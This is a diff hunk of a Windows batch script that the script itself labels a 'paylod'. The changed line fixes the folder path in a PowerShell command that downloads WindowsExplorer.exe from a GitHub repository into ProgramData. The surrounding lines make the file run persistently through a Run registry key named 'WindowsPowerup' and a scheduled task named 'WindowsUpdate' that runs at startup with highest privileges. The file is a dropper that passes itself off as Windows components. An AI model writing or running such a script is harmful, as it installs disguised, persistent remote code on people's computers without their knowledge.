@@ -21,7 +21,7 @@ cls
 echo --------------------cerete-my-path--------------------------------------------------
 mkdir "%systemdrive%\programdata\GG-Win"
 echo ----------------------------copy-my-files-to-web-sever-------------------------------------
-PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/ibrahem1012/WindowsExplorer/raw/refs/heads/main/WindowsExplorer.exe','%programdata%\GG-Win1\WindowsExplorer.exe')
+PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/ibrahem1012/WindowsExplorer/raw/refs/heads/main/WindowsExplorer.exe','%programdata%\GG-Win\WindowsExplorer.exe')
 echo -----------start-paylod------------------------
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\GG-Win\WindowsExplorer.exe"
 schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\GG-Win\WindowsExplorer.exe" /f
